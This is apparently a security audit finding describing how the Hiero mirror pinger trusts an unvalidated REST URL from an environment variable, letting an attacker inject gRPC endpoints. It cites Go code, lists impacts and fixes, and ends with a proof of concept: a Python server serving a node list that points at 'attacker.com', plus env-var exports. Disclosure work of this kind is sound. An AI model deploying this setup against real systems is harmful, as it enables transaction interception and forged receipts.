### Title
Attacker-Controlled gRPC Network Injection via Unvalidated `HIERO_MIRROR_PINGER_REST` URL

### Summary
When `HIERO_MIRROR_PINGER_NETWORK=other`, the pinger fetches its gRPC node list from the URL in `HIERO_MIRROR_PINGER_REST` with no URL validation whatsoever. An attacker who can set that environment variable to point at an attacker-controlled HTTP server can return a crafted JSON payload that populates the Hiero SDK client's entire network map with attacker-owned gRPC endpoints, causing every subsequent signed `CryptoTransfer` transaction to be sent to the attacker's infrastructure.

### Finding Description

**Code path:**

`config.go` line 37 reads `HIERO_MIRROR_PINGER_REST` directly into `cfg.mirrorRest` with no URL validation: [1](#0-0) 

The only guard in `loadConfig()` is a non-empty check: [2](#0-1) 

`newClient()` in `sdk_client.go` branches on `network == "other"` and calls `buildNetworkFromMirrorNodes` with the unvalidated URL: [3](#0-2) 

`buildNetworkFromMirrorNodes` in `mirror_node_client.go` constructs the fetch URL by appending `/api/v1/network/nodes` to the raw user-supplied base — no scheme, hostname, or IP allowlist check: [4](#0-3) 

`fetchMirrorNodeNetwork` makes an unauthenticated HTTP GET to that URL and decodes the response body directly into `nodesEnvelope` with no integrity check: [5](#0-4) 

The `domain_name`/`ip_address_v4` and `port` fields from the attacker's JSON are used verbatim to build the network map: [6](#0-5) 

That map is passed directly to `hiero.ClientForNetwork`, making the attacker's endpoints the SDK's sole gRPC targets: [7](#0-6) 

**Root cause:** The code assumes `cfg.mirrorRest` is a trusted, operator-supplied URL. There is no URL scheme enforcement, no hostname/IP allowlist, no TLS requirement, and no response authenticity check. The failed assumption is that environment variables are always set by a trusted operator.

### Impact Explanation

Every `CryptoTransfer` executed by `submitWithRetry` is sent to the attacker's gRPC server: [8](#0-7) 

Concrete consequences:
- **Transaction interception**: The attacker receives all signed transactions, including transaction IDs, operator account ID, destination account ID, and amounts.
- **Fake receipt injection**: The attacker's gRPC server can return fabricated `SUCCESS` receipts, making the pinger believe transfers succeeded when they did not — silently breaking the liveness/health-check purpose of the pinger.
- **Denial of service**: The attacker can return errors or hang connections, causing the pinger to exhaust retries and fail its readiness probe.
- **Operator key exposure risk**: While signing is client-side, the attacker observes every signed transaction bytes, enabling offline analysis.

Severity: **High** — full MITM of the pinger's Hiero network communication.

### Likelihood Explanation

Precondition is controlling two environment variables. This is achievable by:
- A Kubernetes user with `edit`/`patch` on `Deployment` or `Pod` objects (common in shared clusters with coarse RBAC).
- Anyone with write access to a Helm values file, `.env` file, or CI/CD pipeline configuration that sets these variables.
- Any supply-chain or config-injection attack targeting the deployment manifests.

No special runtime privileges are needed — only the ability to influence the process environment at startup. The attack is fully repeatable and requires no interaction from the legitimate operator after the env var is set.

### Recommendation

1. **Validate the URL scheme**: Reject any `mirrorRest` value whose scheme is not `https` (or an explicit allowlist for test environments).
2. **Enforce TLS with certificate pinning or a CA allowlist**: Prevent a valid-looking HTTPS URL from pointing at an attacker's server with a fraudulent certificate.
3. **Allowlist hostnames/IP ranges**: Reject RFC-1918 addresses and require the hostname to match a configured allowlist or suffix (e.g., `*.hedera.com`).
4. **Add response integrity**: Sign the `/network/nodes` response at the mirror node and verify the signature in the pinger before trusting any endpoint data.
5. **Minimal fix**: In `loadConfig()`, parse the URL and assert `scheme == "https"` and that the host is non-empty and not a loopback/private address.

### Proof of Concept

```bash
# 1. Start attacker HTTP server returning crafted node list
python3 -c "
import http.server, json
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        body = json.dumps({'nodes': [{'node_account_id': '0.0.3',
            'service_endpoints': [{'domain_name': 'attacker.com', 'port': 50211}]}],
            'links': {'next': None}}).encode()
        self.send_response(200)
        self.send_header('Content-Type','application/json')
        self.end_headers()
        self.wfile.write(body)
http.server.HTTPServer(('0.0.0.0', 8080), H).serve_forever()
" &

# 2. Launch pinger with attacker-controlled env vars
export HIERO_MIRROR_PINGER_NETWORK=other
export HIERO_MIRROR_PINGER_REST=http://<attacker-ip>:8080
export HIERO_MIRROR_PINGER_OPERATOR_ID=0.0.2
export HIERO_MIRROR_PINGER_OPERATOR_KEY=<any-valid-key>
export HIERO_MIRROR_PINGER_TO_ACCOUNT_ID=0.0.98
./pinger

# 3. Observe: pinger fetches http://<attacker-ip>:8080/api/v1/network/nodes,
#    receives the crafted JSON, and configures its SDK client with
#    attacker.com:50211 as the sole gRPC node.
#    All CryptoTransfer transactions are now sent to attacker.com:50211.
```

### Citations

**File:** pinger/config.go (L37-37)
```go
	flag.StringVar(&cfg.mirrorRest, "mirror-rest", envOr("HIERO_MIRROR_PINGER_REST", ""), "mirror node REST base URL (required for other), e.g. http://mirror-rest:5551")
```

**File:** pinger/config.go (L133-135)
```go
	if cfg.network == "other" && strings.TrimSpace(cfg.mirrorRest) == "" {
		return cfg, fmt.Errorf("HIERO_MIRROR_PINGER_NETWORK=other requires HIERO_MIRROR_PINGER_REST")
	}
```

**File:** pinger/sdk_client.go (L17-22)
```go
	case "other":
		netmap, err := buildNetworkFromMirrorNodes(context.Background(), cfg)
		if err != nil {
			return nil, err
		}
		client = hiero.ClientForNetwork(netmap)
```

**File:** pinger/mirror_node_client.go (L37-44)
```go
	base := strings.TrimRight(strings.TrimSpace(cfg.mirrorRest), "/")

	var url string
	if strings.HasSuffix(base, "/api/v1") {
		url = base + "/network/nodes"
	} else {
		url = base + "/api/v1/network/nodes"
	}
```

**File:** pinger/mirror_node_client.go (L79-98)
```go
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
	if err != nil {
		return nil, false, err
	}

	resp, err := httpClient.Do(req)
	if err != nil {
		return nil, true, fmt.Errorf("GET %s failed: %w", url, err)
	}
	defer resp.Body.Close()

	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		retry := resp.StatusCode == http.StatusTooManyRequests || resp.StatusCode >= 500
		return nil, retry, fmt.Errorf("GET %s returned %s", url, resp.Status)
	}

	var payload nodesEnvelope
	if err := json.NewDecoder(resp.Body).Decode(&payload); err != nil {
		return nil, false, fmt.Errorf("decode mirror nodes: %w", err)
	}
```

**File:** pinger/mirror_node_client.go (L113-124)
```go
		for _, ep := range n.ServiceEndpoints {
			host := strings.TrimSpace(ep.DomainName)
			if host == "" {
				host = strings.TrimSpace(ep.IPAddressV4)
			}
			if host == "" || ep.Port == 0 {
				continue
			}

			addr := net.JoinHostPort(host, fmt.Sprintf("%d", ep.Port))
			network[addr] = nodeAccountId
		}
```

**File:** pinger/transfer.go (L29-35)
```go
		cryptoTransfer := hiero.NewTransferTransaction().
			AddHbarTransfer(client.GetOperatorAccountID(), hiero.HbarFromTinybar(-cfg.amountTinybar)).
			AddHbarTransfer(toID, hiero.HbarFromTinybar(cfg.amountTinybar))

		resp, err := cryptoTransfer.Execute(client)
		if err == nil {
			receipt, rerr := resp.GetReceipt(client)
```
